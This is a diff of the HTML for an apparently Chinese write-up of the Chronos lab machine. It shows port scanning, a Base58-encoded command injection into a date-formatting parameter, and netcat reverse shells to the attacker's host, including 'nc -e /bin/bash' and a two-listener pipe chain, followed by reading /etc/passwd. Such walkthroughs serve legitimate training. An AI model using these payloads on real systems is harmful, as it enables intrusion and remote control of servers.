@@ -10,15 +10,16 @@
 <p><strong>Difficulty</strong> : medium</p>
 <p>This works better with VirtualBox rather than VMware.</p>
 </blockquote>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 10.0.2.0/24</span><br><span class="line">#netdiscover工具的使用中，发现在网段的真实掩码-8会扫描更快</span><br></pre></td></tr></table></figure>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><pre class="line-numbers language-none"><code class="language-none">sudo netdiscover -r 10.0.2.0&#x2F;24
+#netdiscover工具的使用中，发现在网段的真实掩码-8会扫描更快<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103144507677.png" alt="image-20211103144507677"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103144432159.png" alt="image-20211103144432159"></p>
 <p>发现存活主机，判断靶机IP为10.0.2.6 </p>
-<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p- 10.0.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011164411320.png" alt="image-20211011164411320"></p>
-<h3 id="3-探测端口服务"><a href="#3-探测端口服务" class="headerlink" title="3.探测端口服务"></a>3.探测端口服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure>
+<h3 id="3-探测端口服务"><a href="#3-探测端口服务" class="headerlink" title="3.探测端口服务"></a>3.探测端口服务</h3><pre class="line-numbers language-none"><code class="language-none">sudo nmap -p22,80,8000 -sV 10.0.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103144832211.png" alt="image-20211103144832211"></p>
 <p>探测到的信息：</p>
@@ -27,7 +28,7 @@
 <p>​	目标为<strong>Ubuntu</strong>系统</p>
 <p>​	8000端口：<strong>Node.js</strong>    <strong>Express框架</strong></p>
 <h3 id="4-浏览器访问80端口"><a href="#4-浏览器访问80端口" class="headerlink" title="4.浏览器访问80端口"></a>4.浏览器访问80端口</h3><p>访问80端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://10.0.2.6</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">访问http:&#x2F;&#x2F;10.0.2.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011165055754.png" alt="image-20211011165055754"></p>
 <p>信息:Chronos(靶机名)-Date（日期）&amp;Time（时间）</p>
@@ -39,7 +40,7 @@
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011170318994.png" alt="image-20211011170318994"></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011170456326.png" alt="image-20211011170456326"></p>
 <p>纵观美化后的代码，发现函数名称仍是为编码处理的，但发现可疑信息（URL）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;chronos.local:8000&#x2F;date?format&#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>分析：chronos（靶机名）</p>
 <p>​	local（本地&#x2F;本机）</p>
@@ -49,10 +50,12 @@
 <p>​	怀疑是否<strong>在该页面加载的过程中</strong>：会去访问该URL–&gt;并从中读取相应页面资源–&gt;放置到当前页面中–&gt;显示相应信息</p>
 <h3 id="5-页面绑定hosts"><a href="#5-页面绑定hosts" class="headerlink" title="5.页面绑定hosts"></a>5.页面绑定hosts</h3><p>思路：尝试在本地将10.0.2.6和chronos.loacl<strong>绑定</strong>–&gt;那么重新访问目标80端口（<a target="_blank" rel="noopener" href="http://10.0.2.6)时--&gt;js脚本就能**顺利访问**脚本中的url--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化/">http://10.0.2.6）时--&gt;JS脚本就能**顺利访问**脚本中的URL--&gt;并从中**读取**相应**页面资源**--&gt;放置到当前页面中--&gt;显示相应的**信息**--&gt;页面应该会有**变化</a>**</p>
 <p>操作：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts     </span><br><span class="line">#编辑hosts 手动增加 IP&amp;域名 绑定10.0.2.6和chronos.local</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo vi &#x2F;etc&#x2F;hosts     
+#编辑hosts 手动增加 IP&amp;域名 绑定10.0.2.6和chronos.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011171039018.png" alt="image-20211011171039018"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping chronos.local</span><br><span class="line">#验证绑定是否成功，结果显示域名被正确解析到目标靶机IP</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ping chronos.local
+#验证绑定是否成功，结果显示域名被正确解析到目标靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211011171625340.png" alt="image-20211011171625340"></p>
 <p>结果显示，成功解析</p>
@@ -74,38 +77,38 @@
 <h3 id="2-命令注入漏洞"><a href="#2-命令注入漏洞" class="headerlink" title="2.命令注入漏洞"></a>2.命令注入漏洞</h3><p>使用CyberChef的Magic模块对该字符进行解密</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103151711496.png" alt="image-20211103151711496"></p>
 <p>得到的明文为：（Base58编码…）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>看到明文这样的格式，想到了Linux的date命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>date后添加明文内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">date &#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103152932781.png" alt="image-20211103152932781"></p>
 <p><strong>猜测当访问Web程序URL时，服务端使用的是这条操作系统指令，那么是否可以用符号连接执行命令注入呢？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; || ls  #不可行</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">date &#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39; || ls  #不可行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; &amp;&amp; ls #可行</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">date &#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39; &amp;&amp; ls #可行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153232194.png" alt="image-20211103153232194"></p>
 <p>结合之前的URL，服务端能执行的内容必须是Base58编码之后的格式</p>
 <p>故使用CyberChef将&amp;&amp;ls转为Base58编码形式</p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153344923.png" alt="image-20211103153344923"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">得到：&amp;&amp;ls   --Base58编码--&gt;   yZSGA</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">得到：&amp;&amp;ls   --Base58编码--&gt;   yZSGA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BurpSuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为yZSGA--&gt;Send重放</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--Repeater内将format参数值替换为yZSGA--&gt;Send重放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153429917.png" alt="image-20211103153429917"></p>
 <p>成功接受到服务端响应–&gt;返回当前目录下的文件信息–&gt;<strong>确认存在命令注入漏洞</strong></p>
 <hr>
 <h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-利用思路"><a href="#1-利用思路" class="headerlink" title="1.利用思路"></a>1.利用思路</h3><p>如何利用命令注入漏洞？–&gt;<strong>尝试查看用户可执行文件目录（&#x2F;bin）</strong>–&gt;看是否有可利用点</p>
 <p>CyberChef:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;ls /bin --To Base58--&gt;VAZYW9RHPu6D（下面不再为转码贴附图片**-_-**）</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&amp;&amp;ls &#x2F;bin --To Base58--&gt;VAZYW9RHPu6D（下面不再为转码贴附图片**-_-**）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BurpSuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为VAZYW9RHPu6D--&gt;Send重放</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--Repeater内将format参数值替换为VAZYW9RHPu6D--&gt;Send重放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153619965.png" alt="image-20211103153619965"></p>
 <p>整理目前发现的<strong>可利用信息</strong>：</p>
@@ -115,103 +118,103 @@
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153858760.png" alt="image-20211103153858760"></p>
 <h3 id="2-使用nc建立连接"><a href="#2-使用nc建立连接" class="headerlink" title="2.使用nc建立连接"></a>2.使用nc建立连接</h3><h4 id="验证nc是否可执行"><a href="#验证nc是否可执行" class="headerlink" title="验证nc是否可执行"></a>验证nc是否可执行</h4><p>进行测试，确认nc命令能否正常执行？能否与kali建立反弹连接？</p>
 <p>kali:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444    #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444    #nc侦听4444端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211103153939292.png" alt="image-20211103153939292"></p>
 <p>CyberChef:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 --To Base58--&gt;2an39LDoLgxbVq6NMgJeN3RL7</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&amp;&amp;nc 10.0.2.4 4444 --To Base58--&gt;2an39LDoLgxbVq6NMgJeN3RL7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BurpSuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为2an39LDoLgxbVq6NMgJeN3RL7--&gt;Send重放</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--Repeater内将format参数值替换为2an39LDoLgxbVq6NMgJeN3RL7--&gt;Send重放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104085113440.png" alt="image-20211104085113440"></p>
 <p>显示报错，但在kali端监听端发现<strong>连接可以被正常建立</strong></p>
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104085132470.png" alt="image-20211104085132470"></p>
 <h4 id="验证nc是否包含-e参数"><a href="#验证nc是否包含-e参数" class="headerlink" title="验证nc是否包含-e参数"></a>验证nc是否包含-e参数</h4><h5 id="1-若有则使用-e参数加载反弹shell"><a href="#1-若有则使用-e参数加载反弹shell" class="headerlink" title="1.若有则使用-e参数加载反弹shell"></a>1.若有则使用-e参数加载反弹shell</h5><p>kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444  #nc侦听4444端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104085819231.png" alt="image-20211104085819231"></p>
 <p>CyberChef:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 -e /bin/bash --To Base58--&gt;ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&amp;&amp;nc 10.0.2.4 4444 -e &#x2F;bin&#x2F;bash --To Base58--&gt;ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BurpSuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH--&gt;Send重放</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--Repeater内将format参数值替换为ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH--&gt;Send重放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104090046890.png" alt="image-20211104090046890"></p>
 <p>仍然报错，说明不包含-e参数，且nc建立连接失败，则<strong>确定目标系统上nc版本不包含-e参数</strong></p>
 <h5 id="2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"><a href="#2-若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell" class="headerlink" title="2.若无则可以使用nc串联的方法通过管道方式在两个侦听接口上获得反弹shell"></a>2.若无则可以使用<strong>nc串联</strong>的方法通过管道方式在两个侦听接口上获得反弹shell</h5><p>kali:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #nc侦听4444端口</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444  #nc侦听4444端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555  #nc侦听5555端口</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 5555  #nc侦听5555端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104092959229.png" alt="image-20211104092959229"></p>
 <p>CyberChef:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | nc 10.0.2.4 5555</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&amp;&amp;nc 10.0.2.4 4444 | &#x2F;bin&#x2F;bash | nc 10.0.2.4 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>–To Base58–&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>BurpSuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeater内将format参数值替换为7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS--&gt;Send重放</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">--Repeater内将format参数值替换为7BFuYVuCc4LN4GRLNFCY4RZyKX7GVbfGEaUnJSCQ2RUmJmcZNi67Nw5ewqKqyTusCZS--&gt;Send重放<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104093156854.png" alt="image-20211104093156854"></p>
 <p>至此，nc<strong>建立连接成功</strong></p>
-<h3 id="3-寻找信息"><a href="#3-寻找信息" class="headerlink" title="3.寻找信息"></a>3.寻找信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<h3 id="3-寻找信息"><a href="#3-寻找信息" class="headerlink" title="3.寻找信息"></a>3.寻找信息</h3><pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104093314649.png" alt="image-20211104093314649"></p>
 <p>发现在当前&#x2F;opt&#x2F;chronos目录下，并<strong>没有类似flag的信息</strong></p>
 <p>尝试查看其他目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>​	<img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104094438824.png" alt="image-20211104094438824">	</p>
 <p>​	</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104094604888.png" alt="image-20211104094604888"></p>
 <p>​	发现在home目录下<strong>存在用户imera</strong></p>
 <p>​	尝试查看imera用户文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd imera</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd imera<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104094950343.png" alt="image-20211104094950343"></p>
 <p>很可惜，查看失败，发现只有imera用户自己可以对user.txt进行读写，<strong>只有提权才能执行查看</strong></p>
 <hr>
-<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1-初次尝试提权"><a href="#1-初次尝试提权" class="headerlink" title="1.初次尝试提权"></a>1.初次尝试提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id  #当前用户权限</span><br></pre></td></tr></table></figure>
+<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1-初次尝试提权"><a href="#1-初次尝试提权" class="headerlink" title="1.初次尝试提权"></a>1.初次尝试提权</h3><pre class="line-numbers language-none"><code class="language-none">id  #当前用户权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104095325207.png" alt="image-20211104095325207"></p>
 <p>是一个名为www-data的用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a   #利用是否存在内核漏洞</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname -a   #利用是否存在内核漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104095419553.png" alt="image-20211104095419553"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l	#利用是否存在sudo命令漏洞</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l	#利用是否存在sudo命令漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>没有反馈.</p>
 <p>利用常见的提权方法，都没能找到突破口。</p>
 <p>至此，陷入了困境…-_-</p>
 <hr>
 <h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><p>尝试在其他目录看能否发现突破口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/chronos</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;opt&#x2F;chronos<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104095949572.png" alt="image-20211104095949572"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat package.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104100153967.png" alt="image-20211104100153967"></p>
 <blockquote>
 <p>{<br> “dependencies”: {<br>   “bs58”: “^4.0.1”,<br>   “cors”: “^2.8.5”,<br>   “express”: “^4.17.1”<br> }<br>}</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.js</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat app.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104100502437.png" alt="image-20211104100502437"></p>
 <blockquote>
@@ -230,32 +233,32 @@
 <p>console.log(<code>Server running at $&#123;port&#125;</code>);</p>
 <p>})</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..                   #来到上级目录</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd ..                   #来到上级目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104100626091.png" alt="image-20211104100626091"></p>
 <p>发现chronos-v2文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd chronos-v2</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd chronos-v2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
